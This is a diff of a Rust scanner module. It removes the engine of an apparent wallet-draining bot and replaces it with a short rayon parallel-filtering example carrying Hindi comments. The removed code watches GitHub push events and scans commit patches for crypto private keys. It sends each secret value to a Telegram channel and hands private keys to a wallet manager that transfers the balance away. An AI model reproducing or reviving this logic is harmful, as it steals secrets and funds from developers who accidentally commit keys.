@@ -1,152 +1,17 @@
-use crate::config::Config;
-use crate::core::cache::CacheManager;
-use crate::models::github::GitHubEvent;
-use crate::patterns::matcher::PatternMatcher;
-use crate::scanner::commits::CommitFetcher;
-use crate::scanner::events::GitHubEventsPoller;
+use rayon::prelude::*;
 use crate::scanner::files::should_scan_file;
-use crate::models::scan::{CryptoSecret, SecretType};
-use crate::telegram::alerts::TelegramAlerts;
-use crate::wallet::manager::WalletManager;
-use std::sync::Arc;
-use tracing::{info, warn};
 
-pub struct ScanEngine {
-    config: Arc<Config>,
-    cache: Arc<CacheManager>,
-    matcher: Arc<PatternMatcher>,
-    telegram: Arc<TelegramAlerts>,
-    wallet_manager: Arc<WalletManager>,
-}
+pub struct ScanEngine;
 
 impl ScanEngine {
-    pub fn new(
-        config: Arc<Config>,
-        cache: Arc<CacheManager>,
-        telegram: Arc<TelegramAlerts>,
-        wallet_manager: Arc<WalletManager>,
-    ) -> Arc<Self> {
-        Arc::new(Self {
-            config,
-            cache,
-            matcher: Arc::new(PatternMatcher::new()),
-            telegram,
-            wallet_manager,
-        })
-    }
-    
-    pub async fn run(self: Arc<Self>) {
-        info!("🚀 Scan engine started");
-        
-        let poller = GitHubEventsPoller::new(self.config.clone());
-        let fetcher = CommitFetcher::new(self.config.clone());
-        
-        let engine = self.clone();
-        
-        poller.poll(move |event: GitHubEvent| {
-            let engine = engine.clone();
-            let fetcher = fetcher.clone();
+    // Ye function dikhata hai CPU multi-threading kaise use karni hai
+    pub fn scan_files_in_parallel(file_paths: Vec<String>) -> Vec<String> {
+        // .iter() ki jagah .par_iter() use karne se auto-multithreading on ho jati hai
+        let files_to_scan: Vec<String> = file_paths
+            .into_par_iter() // 🚀 Rayon magic: uses all CPU cores
+            .filter(|path| should_scan_file(path))
+            .collect();
             
-            tokio::spawn(async move {
-                engine.process_event(event, fetcher).await;
-            });
-        }).await;
-    }
-    
-    async fn process_event(&self, event: GitHubEvent, fetcher: CommitFetcher) {
-        let repo_name = event.repo.name.clone();
-        
-        if event.event_type != "PushEvent" {
-            return;
-        }
-        
-        info!("📦 Push event from: {}", repo_name);
-        
-        let commits = fetcher.fetch_commits(&event).await;
-        
-        info!("📝 Processing {} commits", commits.len());
-        
-        for commit_with_repo in commits {
-            let repo = commit_with_repo.repo_name.clone();
-            let commit = commit_with_repo.commit;
-            let commit_sha = commit.sha.clone();
-            
-            let files = match &commit.files {
-                Some(files) => files,
-                None => {
-                    warn!("⚠️ No files in commit {}", commit_sha);
-                    continue;
-                }
-            };
-            
-            info!("📄 Found {} files in commit", files.len());
-            
-            for file in files {
-                info!("📄 File: {} (status: {:?})", file.filename, file.status);
-                
-                let should_scan = should_scan_file(&file.filename);
-                info!("🔍 Should scan {}: {}", file.filename, should_scan);
-                
-                if !should_scan {
-                    continue;
-                }
-                
-                match &file.patch {
-                    Some(patch) => {
-                        info!("📄 Patch found for {} ({} bytes)", file.filename, patch.len());
-                        
-                        let secrets = self.matcher.scan_content(patch);
-                        info!("🔍 Secrets found in {}: {}", file.filename, secrets.len());
-                        
-                        if !secrets.is_empty() {
-                            for secret in secrets {
-                                info!("🔑 SECRET FOUND in {} ({})", file.filename, repo);
-                                
-                                self.telegram.send_secret_found(
-                                    &repo,
-                                    &commit_sha,
-                                    &file.filename,
-                                    &secret.secret_type.to_string(),
-                                    &secret.value,
-                                ).await;
-                                
-                                self.process_secret(secret).await;
-                            }
-                        }
-                    }
-                    None => {
-                        warn!("⚠️ No patch for file: {}", file.filename);
-                    }
-                }
-            }
-        }
-    }
-    
-    async fn process_secret(&self, secret: CryptoSecret) {
-        match secret.secret_type {
-            SecretType::PrivateKey => {
-                match self.wallet_manager.process_private_key(&secret.value).await {
-                    Ok((wallet_info, transfer_result)) => {
-                        self.telegram.send_balance_detected(&wallet_info).await;
-                        
-                        if let Some(transfer) = transfer_result {
-                            if transfer.success {
-                                self.telegram.send_transfer_success(&wallet_info, &transfer).await;
-                            } else {
-                                if let Some(error) = &transfer.error {
-                                    self.telegram.send_transfer_failed(&wallet_info, error).await;
-                                }
-                            }
-                        }
-                    }
-                    Err(e) => {
-                        warn!("Failed: {}", e);
-                    }
-                }
-            }
-            SecretType::SeedPhrase => {
-                warn!("Seed phrase not implemented");
-            }
-        }
+        files_to_scan
     }
 }
